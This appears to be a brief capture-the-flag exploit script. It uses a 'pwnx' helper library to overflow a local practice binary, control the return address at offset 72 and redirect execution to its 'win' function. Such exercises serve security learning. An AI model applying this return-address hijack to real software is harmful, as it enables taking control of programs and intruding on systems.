from pwnx import Challenge, line


c = Challenge("./chall")
c.control(line("payload: "), return_at=72)
c.want(c.exe.win())

c.run()
